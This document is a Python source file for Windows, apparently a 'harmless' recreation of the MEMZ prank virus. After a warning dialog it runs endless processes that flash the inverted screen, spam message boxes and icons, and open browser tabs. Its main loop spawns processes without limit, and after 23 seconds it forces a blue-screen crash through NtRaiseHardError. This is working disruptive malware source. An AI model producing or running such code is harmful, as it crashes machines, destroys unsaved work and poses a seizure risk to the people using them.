import os
from time import time
from turtle import width
from win32api import *
from win32gui import *
from win32ui import * 
from ctypes import windll
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
import random
import time
from sys import exit
import multiprocessing
import pyautogui
import ctypes



websites = (

    "https://www.google.com/",
    "https://www.google.com/search?q=how+to+delete+system32&oq=how+to+delete+system32&aqs=chrome..69i57.6975j0j7&sourceid=chrome&ie=UTF-8",
    "cmd",
    "https://youtube.com/",
    "https://www.helloworld.org/",
    "https://www.google.com/search?q=Is+this+virus+good%3F&oq=Is+this+virus+good%3F&aqs=chrome..69i57.7116j0j7&sourceid=chrome&ie=UTF-8",
    "https://github.com/Kubzelll",
    "http://kubzel.pl/"
    
)

IconWarning = LoadIcon(None, 32515)
IconError = LoadIcon(None, 32513)

def open_web():
        for i in range(0,10):
            os.system("start " + str(choice(websites)))
        time.sleep(3)






def blinkscr():

    
    global time
    global timeSubtract
    x = 1920
    y = 1080

    try:
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            PatBlt(HDC, 0,0,x,y, PATINVERT)
    except:
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            PatBlt(HDC, 0,0,x,y, PATINVERT)



def warning_spam():
    while True:
        multiprocessing.Process(target = msgbox_thread).start()
        


def screen_puzzle():
    HDC = GetDC(0)
    sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
    x1 = rd(sw-100)
    y1 = rd(sh-100)
    x2 = rd(sw-100)
    y2 = rd(sw-100)

    width = rd(600)
    height = rd(600)
    while True:
       BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
    



def error_drawing():
    global time
    global timeSubstract
    HDC = GetDC(0)
    sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
    while True:
        DrawIcon(HDC, rd(sh), rd(sh), IconWarning)
        for i in range(0, 60):
            mouseX,mouseY = GetCursorPos()
            DrawIcon(HDC, mouseX, mouseY, IconError)
            Sleep(10)


def bsod():

    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")


def msgbox_thread():
    while True:
        MessageBox("still using computer?", "lol", MB_OK | MB_ICONWARNING)

def first_msg():
    MessageBox("your computer is going to be destroyed enjoy", "enjoy", MB_OK | MB_ICONWARNING)
    pass


def running():
    if MessageBox("DONT RUN THIS IF U ARE EPILEPTIC This is harmless version of memz by Kubzel. Also be sure all files are saved to just don't lose unsaved files. Do you want to continue? ", "Memz reacreated", MB_YESNO | MB_ICONWARNING) == 7:
        MessageBox("OK, exiting", "OKe")
        exit()
    else:
        main()

def randomcursor():
    while True:
        h = random.randint(0,1080)
        w = random.randint(0,1920)
        pyautogui.click(h, w, duration=0.3)
        pyautogui.hotkey('winleft', "m")

    
def timer():
    time.sleep(23)
    bsod()
    

def main():
    while True:

        blinkscr_thread = multiprocessing.Process(target = blinkscr)
        time_thread = multiprocessing.Process(target = timer)
        openweb_thread = multiprocessing.Process(target = open_web)
        drawing_thead = multiprocessing.Process(target = error_drawing)
        firstmsg_thread = multiprocessing.Process(target = first_msg)
        warning = multiprocessing.Process(target = msgbox_thread)
        puzzle_thread = multiprocessing.Process(target = screen_puzzle)
        randomcursor_thread = multiprocessing.Process(target = randomcursor)
        firstmsg_thread.start()
        
        time_thread.start()
      #  randomcursor_thread.start()
        time.sleep(3)
        openweb_thread.start()
        firstmsg_thread.terminate()
        blinkscr_thread.start()
    #   time.sleep(2)
    #   blinkscr_thread.terminate()
        drawing_thead.start()
        warning.start()
        puzzle_thread.start()


    






if __name__ == "__main__":
    running()
